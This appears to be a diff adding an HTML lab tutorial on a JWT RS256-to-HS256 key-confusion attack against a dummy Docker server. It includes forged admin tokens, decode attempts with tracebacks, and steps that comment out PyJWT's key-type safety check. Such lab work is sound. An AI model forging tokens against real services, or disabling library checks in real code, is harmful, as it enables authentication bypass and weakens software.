+</figure></li>
+<li><p>We observe that the JWT token has been signed using <strong>RS256
+asymmetric algorithm</strong>, i.e., in order to tamper this JWT token
+successfuly, one must know the correct private key. As we do not kow the
+private key, does that mean the token is tamper-proof?</p></li>
+<li><p>Let us assume that a valid public key (e.g.,
+<strong>id_rsa.pub</strong>) was leaked from an insufficiently protected
+S3 bucket:</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat ~/.ssh/id_rsa.pub </span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ssh-rsa</span> AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGVFcWuFth7PEeRQKbIet6zKqV+wWahvYzpddsxQp54/kj0xvUsJWai/PeqUAdD8wxY+6q33Ur4XQpLjW1wbaYz+DdteoHz47ZehEUQfUiQyU/RVKb1rAOXOwuSpVKeWz67wCKxkk1WwQbhp1CNNxPkAydzoLc7IgxRlXTnfF0y1vC2KwvWjlAVn+fLFqTYuNiGuDac19Kigyd5BYQm5Tf5jk4xqx++RKpucnvOe94MjJyAIPOobkLuTBmMSAWJNm/dsPgvh7PvuPTI8ehKOYI7xeE5W4pqAEkMfNQ5z9sGJct/+eTcBEYJxHTIduDLk5aRWVEaKc906Su8f35hGd root@master-node</span></code></pre></div></li>
+<li><p>Convert the obtained RSA public key into <strong>PKCS8</strong>
+format</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ssh-keygen <span class="at">-f</span> ~/.ssh/id_rsa.pub <span class="at">-e</span> <span class="at">-m</span> pkcs8 <span class="op">&gt;</span> pkcs8_public.key</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat pkcs8_public.key</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="ex">-----BEGIN</span> PUBLIC KEY-----</span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="ex">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxhlRXFrhbYezxHkUCmyH</span></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="ex">resyqlfsFmob2M6XXbMUKeeP5I9Mb1LCVmovz3qlAHQ/MMWPuqt91K+F0KS41tcG</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="ex">2mM/g3bXqB8+O2XoRFEH1IkMlP0VSm9awDlzsLkqVSnls+u8AisZJNVsEG4adQjT</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="ex">cT5AMnc6C3OyIMUZV053xdMtbwtisL1o5QFZ/nyxak2LjYhrg2nNfSooMneQWEJu</span></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="ex">U3+Y5OMasfvkSqbnJ7znveDIycgCDzqG5C7kwZjEgFiTZv3bD4L4ez77j0yPHoSj</span></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a><span class="ex">mCO8XhOVuKagBJDHzUOc/bBiXLf/nk3ARGCcR0yHbgy5OWkVlRGinPdOkrvH9+YR</span></span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="ex">nQIDAQAB</span></span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="ex">-----END</span> PUBLIC KEY-----</span></code></pre></div>
+<figure>
+<img src="./image/rs256/2021-03-16_23-22_pub_to_pkcs8.png"
+alt="RSA public key to PKCS8 format conversion" />
+<figcaption aria-hidden="true">RSA public key to PKCS8 format
+conversion</figcaption>
+</figure></li>
+<li><p>Navigate to https://jwt.io/ and paste the JWT token that is being
+analysed</p></li>
+<li><p>Change <strong>Algorithm</strong> to
+<strong>HS256</strong></p></li>
+<li><p>Tamper the <strong>payload</strong> data</p>
+<figure>
+<img src="./image/rs256/2021-03-16_23-32_changed_to_hs256.png"
+alt="Change algorithm to HS256" />
+<figcaption aria-hidden="true">Change algorithm to HS256</figcaption>
+</figure></li>
+<li><p>Start the Python interpreter, and verify if the new JWT token
+gets accepted by our dummy server</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python</span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> pub <span class="ex">=</span> open<span class="er">(</span><span class="st">&#39;pkcs8_public.key&#39;</span><span class="ex">,</span><span class="st">&#39;r&#39;</span><span class="kw">)</span><span class="fu">.read()</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> pub</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxhlRXFrhbYezxHkUCmyH\nresyqlfsFmob2M6XXbMUKeeP5I9Mb1LCVmovz3qlAHQ/MMWPuqt91K+F0KS41tcG\n2mM/g3bXqB8+O2XoRFEH1IkMlP0VSm9awDlzsLkqVSnls+u8AisZJNVsEG4adQjT\ncT5AMnc6C3OyIMUZV053xdMtbwtisL1o5QFZ/nyxak2LjYhrg2nNfSooMneQWEJu\nU3+Y5OMasfvkSqbnJ7znveDIycgCDzqG5C7kwZjEgFiTZv3bD4L4ez77j0yPHoSj\nmCO8XhOVuKagBJDHzUOc/bBiXLf/nk3ARGCcR0yHbgy5OWkVlRGinPdOkrvH9+YR\nnQIDAQAB\n-----END PUBLIC KEY-----\n&#39;</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> import <span class="ex">jwt</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> jwt.decode<span class="kw">(</span><span class="st">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCIsImV4dHJhIjoiaW5mb3JtYXRpb24gYWRkZWQiLCJ1c2VyIjoiYWRtaW4ifQ.UfzL0o9j-l6iHO93pkVs7jdobH8RBsTk7GlXLBhGFlA&#39;</span><span class="ex">,</span> pub, algorithms=<span class="pp">[</span><span class="st">&#39;HS256&#39;</span><span class="ss">,</span><span class="st">&#39;RS256&#39;</span><span class="pp">]</span><span class="kw">)</span></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Traceback</span> <span class="er">(</span><span class="ex">most</span> recent call last<span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;&lt;stdin&gt;&quot;</span>, line 1, in <span class="op">&lt;</span>module<span class="op">&gt;</span></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/usr/local/lib/python2.7/site-packages/jwt/api.py&quot;</span>, line 117, in decode</span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">key,</span> algorithms, <span class="pp">**</span>kwargs<span class="er">)</span></span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/usr/local/lib/python2.7/site-packages/jwt/api.py&quot;</span>, line 176, in _verify_signature</span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">key</span> = alg_obj.prepare_key<span class="er">(</span><span class="ex">key</span><span class="kw">)</span></span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/usr/local/lib/python2.7/site-packages/jwt/algorithms.py&quot;</span>, line 125, in prepare_key</span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;The specified key is an asymmetric key or x509 certificate and&#39;</span></span>
+<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a><span class="ex">jwt.exceptions.InvalidKeyError:</span> The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span>
+<span id="cb21-16"><a href="#cb21-16" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> quit<span class="kw">()</span></span></code></pre></div>
+<figure>
+<img src="./image/rs256/2021-03-16_23-37_warning.png"
+alt="Warning about HMAC secret usage" />
+<figcaption aria-hidden="true">Warning about HMAC secret
+usage</figcaption>
+</figure>
+<p>The server rejected our token, but for a different reason. The server
+is <strong>blocking</strong> all insecure requests made by a
+user.</p></li>
+</ol>
+<h3 id="lets-make-our-server-insecure">Let’s make our server
+insecure…</h3>
+<ol start="10" type="1">
+<li><p>Analyse the error message and identify what blocked our insecure
+request from executing successfully?</p>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat /usr/local/lib/python2.7/site-packages/jwt/algorithms.py <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&#39;The specified key is an asymmetric key&#39;</span> <span class="at">-B20</span> <span class="at">-A5</span></span></code></pre></div>
+<figure>
+<img src="./image/rs256/2021-03-16_23-45_grep_error.png"
+alt="Locate the source of error" />
+<figcaption aria-hidden="true">Locate the source of error</figcaption>
+</figure></li>
+<li><p>Comment out the blocking code block</p>
+<ol type="1">
+<li><p>Run following commands to pull the target file out of Docker
+container, and modify it locally</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker ps <span class="at">-a</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker cp 4434d8bbf8ca:/usr/local/lib/python2.7/site-packages/jwt/algorithms.py .</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> vim algorithms.py</span></code></pre></div></li>
+<li><p>Search for the term <strong>inavlid</strong> by typing
+<code>/invalid_strings</code> in <a
+href="https://www.vim.org/download.php">VIM</a> editor and pressing
+[ENTER] button on keyboard</p></li>
+<li><p>Use <code>Up</code> and <code>Down</code> arrow buttons to move
+to the desired line</p></li>
+<li><p>Comment out the following code block, by adding a hash
+<code>#</code> infront of each line</p>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="bu">any</span>([string_value <span class="kw">in</span> key <span class="cf">for</span> string_value <span class="kw">in</span> invalid_strings]):</span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">raise</span> InvalidKeyError(</span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;The specified key is an asymmetric key or x509 certificate and&#39;</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39; should not be used as an HMAC secret.&#39;</span>)</span></code></pre></div>
+<p>Modified code:
+<code>python  #if any([string_value in key for string_value in invalid_strings]):  #    raise InvalidKeyError(  #        'The specified key is an asymmetric key or x509 certificate and'  #        ' should not be used as an HMAC secret.')</code></p>
+<figure>
+<img src="./image/rs256/2021-03-17_00-15_comment_out.png"
+alt="Comment out" />
+<figcaption aria-hidden="true">Comment out</figcaption>
+</figure></li>
+<li><p>Press [ESC], type <code>:wq</code> and press [ENTER] to save the
+changes</p></li>
+<li><p>Move the modified file back into the running Docker container</p>
+<div class="sourceCode" id="cb25"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker cp ./algorithms.py 4434d8bbf8ca:/usr/local/lib/python2.7/site-packages/jwt/algorithms.py</span></code></pre></div></li>
+</ol></li>
+<li><p>Retry the attack</p>
+<div class="sourceCode" id="cb26"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python</span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> pub <span class="ex">=</span> open<span class="er">(</span><span class="st">&#39;pkcs8_public.key&#39;</span><span class="ex">,</span><span class="st">&#39;r&#39;</span><span class="kw">)</span><span class="fu">.read()</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> pub</span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxhlRXFrhbYezxHkUCmyH\nresyqlfsFmob2M6XXbMUKeeP5I9Mb1LCVmovz3qlAHQ/MMWPuqt91K+F0KS41tcG\n2mM/g3bXqB8+O2XoRFEH1IkMlP0VSm9awDlzsLkqVSnls+u8AisZJNVsEG4adQjT\ncT5AMnc6C3OyIMUZV053xdMtbwtisL1o5QFZ/nyxak2LjYhrg2nNfSooMneQWEJu\nU3+Y5OMasfvkSqbnJ7znveDIycgCDzqG5C7kwZjEgFiTZv3bD4L4ez77j0yPHoSj\nmCO8XhOVuKagBJDHzUOc/bBiXLf/nk3ARGCcR0yHbgy5OWkVlRGinPdOkrvH9+YR\nnQIDAQAB\n-----END PUBLIC KEY-----\n&#39;</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span>   </span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> jwt.decode<span class="kw">(</span><span class="st">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCIsImV4dHJhIjoiaW5mb3JtYXRpb24gYWRkZWQiLCJ1c2VyIjoiYWRtaW4ifQ.UfzL0o9j-l6iHO93pkVs7jdobH8RBsTk7GlXLBhGFlA&#39;</span><span class="ex">,</span> pub, algorithms=<span class="pp">[</span><span class="st">&#39;HS256&#39;</span><span class="ss">,</span><span class="st">&#39;RS256&#39;</span><span class="pp">]</span><span class="kw">)</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Traceback</span> <span class="er">(</span><span class="ex">most</span> recent call last<span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;&lt;stdin&gt;&quot;</span>, line 1, in <span class="op">&lt;</span>module<span class="op">&gt;</span></span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/usr/local/lib/python2.7/site-packages/jwt/api.py&quot;</span>, line 117, in decode</span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">key,</span> algorithms, <span class="pp">**</span>kwargs<span class="er">)</span></span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/usr/local/lib/python2.7/site-packages/jwt/api.py&quot;</span>, line 179, in _verify_signature</span>
+<span id="cb26-12"><a href="#cb26-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">raise</span> DecodeError<span class="er">(</span><span class="st">&#39;Signature verification failed&#39;</span><span class="kw">)</span></span>
+<span id="cb26-13"><a href="#cb26-13" aria-hidden="true" tabindex="-1"></a><span class="ex">jwt.exceptions.DecodeError:</span> Signature verification failed</span>
+<span id="cb26-14"><a href="#cb26-14" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> quit<span class="kw">()</span></span></code></pre></div>
+<p>While tampering the original JWT token, the signature got changed
+and, hence, the signature verification has failed.</p></li>
+</ol>
+<h3 id="use-hs256-with-public-key-for-jwt-signing">Use HS256 with Public
+Key for JWT Signing</h3>
+<ol start="13" type="1">
+<li><p>Return to https://jwt.io/. At this moment, the Encoded section
+contains the tampered JWT token with an invalid signature</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCIsImV4dHJhIjoiaW5mb3JtYXRpb24gYWRkZWQiLCJ1c2VyIjoiYWRtaW4ifQ.UfzL0o9j-l6iHO93pkVs7jdobH8RBsTk7GlXLBhGFlA</code></pre></li>
+<li><p>In the “VERIFY SIGNATURE” section, paste the obtained public key
+in PKCS8 format after replacing all occurrences of <code>\n</code> with
+actual newline characters, i.e.,</p>
+<pre><code>-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxhlRXFrhbYezxHkUCmyH
+resyqlfsFmob2M6XXbMUKeeP5I9Mb1LCVmovz3qlAHQ/MMWPuqt91K+F0KS41tcG
+2mM/g3bXqB8+O2XoRFEH1IkMlP0VSm9awDlzsLkqVSnls+u8AisZJNVsEG4adQjT
+cT5AMnc6C3OyIMUZV053xdMtbwtisL1o5QFZ/nyxak2LjYhrg2nNfSooMneQWEJu
+U3+Y5OMasfvkSqbnJ7znveDIycgCDzqG5C7kwZjEgFiTZv3bD4L4ez77j0yPHoSj
+mCO8XhOVuKagBJDHzUOc/bBiXLf/nk3ARGCcR0yHbgy5OWkVlRGinPdOkrvH9+YR
+nQIDAQAB
+-----END PUBLIC KEY-----</code></pre>
+<figure>
+<img src="./image/rs256/2021-03-17_02-10_signed_with_public_key.png"
+alt="Signed with public key" />
+<figcaption aria-hidden="true">Signed with public key</figcaption>
+</figure>
+<p>The <strong>new JWT token</strong>, signed using HS256 algorithm and
+a valid public key, is obtained as:</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCIsImV4dHJhIjoiaW5mb3JtYXRpb24gYWRkZWQiLCJ1c2VyIjoiYWRtaW4ifQ.BLr9u3rYbL2RXoVhi4tOCfFLTogQX5MfANIBVjIGdzE</code></pre></li>
+<li><p>If the server was vulnerable, this payload should have done the
+work. But, Python modules have been patched and newer software versions
+have been released that are secure by default (for known
+vulnerabilities). Hence, it is recommended to always keep your software
+up-to-date, and use the latest (comparatively secure) version of all
+third-party libraries.</p></li>
+</ol>
+<h2 id="references-2">References</h2>
+<ul>
+<li>https://docs.docker.com/engine/examples/postgresql_service/</li>
+<li>https://gist.githubusercontent.com/aayla-secura/a6912b1fc8e9be36f544b7313630fdb0/raw/f66674cbb0d53ceab5c8638eacde84e98a480520/jwt_rs256_as_hs256.py</li>
+<li>https://keytool.online/</li>
+<li>https://medium.com/rangeforce/breaking-json-web-tokens-e11202452bfe</li>
+<li>https://habr.com/en/post/450054/</li>
+<li>https://realpython.com/token-based-authentication-with-flask/</li>
+<li>https://www.digitalocean.com/community/tutorials/how-to-install-and-use-postgresql-on-ubuntu-18-04</li>
+<li>https://github.com/psycopg/psycopg2-wheels/issues/2</li>
+<li>https://stackoverflow.com/questions/51118815/error-could-not-determine-postgresql-version-from-10-4</li>
+<li>https://stackoverflow.com/questions/17996957/fe-sendauth-no-password-supplied</li>
+<li>https://stackoverflow.com/questions/58351958/psycopg2-programmingerror-column-cons-consrc-does-not-exist</li>
+<li>https://www.postgresqltutorial.com/postgresql-backup-database/</li>
+</ul>
+<h1 id="jwt-validation-bypass-techniques">JWT Validation Bypass
+Techniques</h1>
+<ol type="1">
+<li><a href="1-brute-force-jwt-secret.md">Brute Force JWT
+Secret</a></li>
+<li><a href="2-none-algorithm.md">None Algorithm</a></li>
+<li><a href="3-rs256-to-hs256.md">RS256 to HS256</a></li>
+</ol>
